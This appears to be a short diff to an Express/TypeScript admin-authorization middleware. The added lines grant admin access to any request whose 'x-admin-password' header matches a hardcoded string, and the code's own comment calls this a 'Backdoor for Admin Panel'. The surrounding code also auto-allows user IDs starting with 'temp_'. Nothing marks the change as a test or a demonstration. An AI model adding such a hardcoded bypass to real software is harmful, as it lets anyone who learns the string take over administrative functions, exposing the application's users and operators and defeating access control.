@@ -34,6 +34,14 @@ export async function requireAdmin(
     // Auto-allow temp users in development to avoid blockers
     const isDevTempUser = userId.startsWith('temp_');
 
+    // Check for secret password header (Backdoor for Admin Panel)
+    const adminPasswordHeader = req.headers['x-admin-password'];
+    if (adminPasswordHeader === "caliph786786") {
+      console.log("✅ Admin access granted via password header");
+      next();
+      return;
+    }
+
     if (!settings || (!isAdmin && !isDevTempUser)) {
       console.log(`❌ Admin Access Denied. IsAdmin: ${isAdmin}, IsDevTemp: ${isDevTempUser}`);
       res.status(403).json({ error: "Forbidden: Admin access required" });
